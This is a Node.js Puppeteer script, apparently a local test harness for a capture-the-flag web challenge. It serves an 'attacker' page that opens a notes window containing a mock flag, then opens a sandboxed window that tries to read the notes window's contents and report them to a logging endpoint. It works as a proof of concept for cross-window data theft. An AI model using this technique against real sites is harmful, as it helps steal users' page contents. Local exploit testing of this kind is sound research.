const path = require("path");
const puppeteer = require(path.resolve(__dirname, "../challenge_mouse/bot/node_modules/puppeteer-core"));
const http = require("http");

(async () => {
  const browser = await puppeteer.launch({
    headless: "new",
    executablePath: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    args: ["--no-sandbox", "--disable-dev-shm-usage"]
  });

  // Server
  const server = http.createServer((req, res) => {
    console.log("[SERVER]", req.method, req.url);
    if (req.url === "/attacker") {
      res.setHeader("Content-Type", "text/html");
      res.end(`<!doctype html>
<html>
<body>
<script>
// Open win1 (notes)
const w1 = window.open("http://127.0.0.1:9876/target_notes", "notes_win");
// Wait and open win2 (exploit)
setTimeout(() => {
  const w2 = window.open("http://127.0.0.1:9876/target_sandboxed", "exploit_win");
}, 1000);
</script>
</body>
</html>`);
    } else if (req.url === "/target_notes") {
      res.setHeader("Content-Type", "text/html");
      res.end(`<!doctype html>
<html>
<head><title>Notes List</title></head>
<body>
<h1>Secret Flag ID: abcdef12</h1>
</body>
</html>`);
    } else if (req.url.startsWith("/log")) {
      console.log("[REPORTED LOG]", req.url);
      res.end("ok");
    } else if (req.url === "/target_sandboxed") {
      res.setHeader("Content-Type", "text/html");
      res.setHeader("Content-Security-Policy", "sandbox allow-scripts allow-same-origin; script-src 'self' 'unsafe-inline'; connect-src *");
      res.end(`<!doctype html>
<html>
<body>
<script>
async function report(m) {
  await fetch("/log?msg=" + encodeURIComponent(m));
}
try {
  const ref = window.open("", "notes_win");
  if (ref) {
    let body = "";
    try { body = ref.document.body.innerHTML; } catch(err) { body = "ACCESS_DENIED: " + err.message; }
    report("REF_EXISTS, body=" + body);
  } else {
    report("REF_NULL");
  }
} catch (e) {
  report("OPEN_ERROR: " + e.message);
}
</script>
</body>
</html>`);
    }
  });

  await new Promise(r => server.listen(9876, r));

  browser.on("targetcreated", async target => {
    const p = await target.page();
    if (p) p.on("console", msg => console.log("[TARGET CONSOLE]", msg.text()));
  });

  const page = await browser.newPage();
  page.on("console", msg => console.log("[CONSOLE]", msg.type(), msg.text()));

  await page.goto("http://127.0.0.1:9876/attacker", { waitUntil: "domcontentloaded" });
  await new Promise(r => setTimeout(r, 4000));

  await browser.close();
  server.close();
})();
